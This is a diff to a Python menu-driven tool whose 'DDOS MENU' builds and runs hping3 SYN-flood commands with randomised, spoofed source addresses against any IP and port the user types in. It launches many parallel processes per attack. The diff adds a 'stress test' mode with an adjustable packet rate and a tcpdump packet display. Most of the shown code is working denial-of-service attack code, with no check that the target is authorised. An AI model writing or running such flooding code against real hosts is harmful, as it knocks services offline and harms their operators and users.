@@ -1243,102 +1243,112 @@ def signal_handler(sig, frame):
 
 signal.signal(signal.SIGINT, signal_handler)
 
-def run_hping3_good_dos(target_ip, target_port, threads):
-    command_good_dos = f"sudo hping3 --flood --syn -p {target_port} --rand-source -i u10000 {target_ip}"
-    print(Fore.YELLOW + f"Running Good DOS attack on {target_ip} using port {target_port} with {threads} threads...")
+def show_packets(command):
+    """Function to show packets being sent in real-time using tcpdump."""
+    try:
+        print("Starting to show packets...")
 
-    def packet_monitor():
-        # Monitor packets sent by hping3 and show them in real-time
-        command_monitor = f"sudo hping3 --flood --syn -p {target_port} --rand-source -i u10000 {target_ip}"
-        process = subprocess.Popen(command_monitor, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        # Run tcpdump with sudo to capture only the relevant packets
+        capture_command = "sudo tcpdump -i any -nn -v -A 'tcp' 2>/dev/null"  # Captures only TCP packets
+        process = subprocess.Popen(capture_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 
+        # Read and display tcpdump output in real-time
         while True:
             output = process.stdout.readline()
             if output == b"" and process.poll() is not None:
                 break
             if output:
                 line = output.decode('utf-8').strip()
-                # Display packet information with color based on content
-                print(Fore.GREEN + line)
+                print(line)  # You can add colors or formatting here if desired
 
-    # Start the packet monitor in a separate thread
-    monitor_thread = threading.Thread(target=packet_monitor)
-    monitor_thread.daemon = True
-    monitor_thread.start()
+    except Exception as e:
+        print(f"Error capturing packets: {e}")
 
-    # Send packets with hping3
+
+def run_hping3_good_dos_stress(target_ip, target_port, threads, packet_rate):
+    """
+    Stress test the target with hping3 Good DOS attack while controlling packet rate.
+    """
+    command_good_dos = f"sudo hping3 --flood --syn -p {target_port} --rand-source -i {packet_rate} {target_ip}"
+    print(f"Running Good DOS stress test on {target_ip} using port {target_port} with {threads} threads...")
+
+    for _ in range(threads):
+        subprocess.Popen(command_good_dos, shell=True)
+
+    print(f"Stress test running with packet rate: {packet_rate}")
+
+
+def run_hping3_good_dos(target_ip, target_port, threads):
+    command_good_dos = f"sudo hping3 --flood --syn -p {target_port} --rand-source -i u10000 {target_ip}"
+    print(f"Running Good DOS attack on {target_ip} using port {target_port} with {threads} threads...")
+
     for _ in range(threads):
         subprocess.run(command_good_dos, shell=True)
 
-    monitor_thread.join()
 
 def run_hping3_kill_mode(target_ip, target_port, threads):
     command_kill_mode = f"sudo hping3 --flood --syn -p {target_port} --rand-source -i u10000 {target_ip}"
-    print(Fore.YELLOW + f"Running Kill Mode attack on {target_ip} using port {target_port} with {threads} threads...")
+    print(f"Running Kill Mode attack on {target_ip} using port {target_port} with {threads} threads...")
 
-    def packet_monitor():
-        # Monitor packets sent by hping3 and show them in real-time
-        command_monitor = f"sudo hping3 --flood --syn -p {target_port} --rand-source -i u10000 {target_ip}"
-        process = subprocess.Popen(command_monitor, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-
-        while True:
-            output = process.stdout.readline()
-            if output == b"" and process.poll() is not None:
-                break
-            if output:
-                line = output.decode('utf-8').strip()
-                # Display packet information with color based on content
-                print(Fore.RED + line)
-
-    # Start the packet monitor in a separate thread
-    monitor_thread = threading.Thread(target=packet_monitor)
-    monitor_thread.daemon = True
-    monitor_thread.start()
-
-    # Send packets with hping3
     for _ in range(threads):
         subprocess.run(command_kill_mode, shell=True)
 
-    monitor_thread.join()
+
+def stress_test_good_dos_prompt():
+    while True:
+        try:
+            target_ip = input("Enter the target IP address: ").strip()
+            target_port = input("Enter the port number (e.g., 80): ").strip()
+            threads = int(input("Enter the number of threads (e.g., 20, 50, 100, 250): ").strip())
+            packet_rate = input("Enter the packet rate (e.g., u1000, u5000, u10000): ").strip()
+
+            if threads in [20, 50, 100, 250, 500, 1000]:
+                # Start the packet capturing in a separate thread
+                packet_thread = threading.Thread(target=show_packets, args=("tcpdump",))
+                packet_thread.daemon = True
+                packet_thread.start()
+
+                # Run the Good DOS stress test
+                run_hping3_good_dos_stress(target_ip, target_port, threads, packet_rate)
+            else:
+                print("Invalid thread count. Please enter one of the allowed values.")
+                continue
+        except Exception as e:
+            print(f"Error running command: {e}")
+        
+        cont = input("Do you want to run another stress test? (y/n): ").strip().lower()
+        if cont != 'y':
+            print("Returning to the menu...")
+            break
+
 
 def hping3_menu():
     while True:
-        print(Style.BRIGHT + Fore.BLUE + "\n=== DDos MENU ===")
+        print("*****************")
+        print("\== DDOS MENU ==")
         print("1. Good DOS Attack")
         print("2. Kill Mode Attack")
-        print("3. Return to Main Menu")
-
-        choice = input(Fore.CYAN + "Choose an option: ")
+        print("3. Stress Test Mode")
+        print("4. Return to Main Menu")
+        print("***********************")
+        choice = input("Choose an option: ")
 
         if choice == "1":
-            try:
-                target_ip = input("Enter the target IP address: ").strip()
-                target_port = input("Enter the port number (e.g., 80): ").strip()
-                threads = int(input("Enter the number of threads (10, 20, 50, 80, 100, 250, 500, 1000): ").strip())
-
-                if threads in [10, 20, 50, 80, 100, 250, 500, 1000]:
-                    run_hping3_good_dos(target_ip, target_port, threads)
-                else:
-                    print("Invalid thread count. Please enter one of the allowed values.")
-            except Exception as e:
-                print(f"Error: {e}")
+            target_ip = input("Enter the target IP address: ").strip()
+            target_port = input("Enter the port number (e.g., 80): ").strip()
+            threads = int(input("Enter the number of threads (e.g., 20, 50, 100, 250): ").strip())
+            run_hping3_good_dos(target_ip, target_port, threads)
         elif choice == "2":
-            try:
-                target_ip = input("Enter the target IP address: ").strip()
-                target_port = input("Enter the port number (e.g., 80): ").strip()
-                threads = int(input("Enter the number of threads (10, 20, 50, 80, 100, 250, 500, 1000): ").strip())
-
-                if threads in [10, 20, 50, 80, 100, 250, 500, 1000]:
-                    run_hping3_kill_mode(target_ip, target_port, threads)
-                else:
-                    print("Invalid thread count. Please enter one of the allowed values.")
-            except Exception as e:
-                print(f"Error: {e}")
+            target_ip = input("Enter the target IP address: ").strip()
+            target_port = input("Enter the port number (e.g., 80): ").strip()
+            threads = int(input("Enter the number of threads (e.g., 20, 50, 100, 250): ").strip())
+            run_hping3_kill_mode(target_ip, target_port, threads)
         elif choice == "3":
-            print(Fore.CYAN + "Returning to the main menu...")
+            stress_test_good_dos_prompt()
+        elif choice == "4":
             break
         else:
-            print(Fore.RED + "Invalid choice, please try again.")
+            print("Invalid choice, please try again.")
 
 def whois_lookup():
     try:
